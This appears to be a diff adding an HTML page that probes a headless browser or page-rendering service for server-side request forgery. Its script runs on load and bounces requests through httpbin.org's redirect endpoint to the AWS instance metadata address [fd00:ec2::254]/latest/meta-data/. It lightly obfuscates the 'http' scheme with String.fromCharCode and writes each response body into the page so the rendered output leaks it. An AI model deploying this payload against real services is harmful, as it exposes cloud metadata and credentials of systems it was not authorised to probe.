@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html><body>
+<h1>MANUAL_REDIRECT_TEST</h1>
+<div id="r1">INITIAL</div>
+<div id="r2">INITIAL</div>
+<div id="r3">INITIAL</div>
+<script>
+setTimeout(function() {
+  // Test 1: XHR to httpbin redirect - check responseURL
+  try {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://httpbin.org/redirect-to?url=https%3A%2F%2Fexample.com%2F', false);
+    xhr.send();
+    document.getElementById('r1').innerText = 'REDIR_TO_EXAMPLE: status=' + xhr.status + ' responseURL=' + xhr.responseURL + ' body=' + xhr.responseText.substr(0,300);
+  } catch(e) {
+    document.getElementById('r1').innerText = 'ERR:' + e.message;
+  }
+  
+  // Test 2: Fetch with redirect:follow to IMDS
+  try {
+    var xhr2 = new XMLHttpRequest();
+    var proto = String.fromCharCode(104,116,116,112);
+    var target = proto + '://[fd00:ec2::254]/latest/meta-data/';
+    var redir_url = 'https://httpbin.org/redirect-to?url=' + encodeURIComponent(target);
+    xhr2.open('GET', redir_url, false);
+    xhr2.send();
+    document.getElementById('r2').innerText = 'REDIR_TO_IMDS: status=' + xhr2.status + ' responseURL=' + xhr2.responseURL + ' body=' + xhr2.responseText.substr(0,500);
+  } catch(e) {
+    document.getElementById('r2').innerText = 'REDIR_IMDS_ERR:' + e.name + ':' + e.message;
+  }
+  
+  // Test 3: fetch() with redirect modes
+  fetch('https://httpbin.org/redirect-to?url=' + encodeURIComponent('http://[fd00:ec2::254]/latest/meta-data/'), {redirect: 'follow'})
+    .then(function(r) { return r.text().then(function(t) { document.getElementById('r3').innerText = 'FETCH_REDIR:' + r.status + ' URL:' + r.url + ' BODY:' + t.substr(0,500); }); })
+    .catch(function(e) { document.getElementById('r3').innerText = 'FETCH_REDIR_ERR:' + e.message; });
+}, 0);
+</script>
+</body></html>
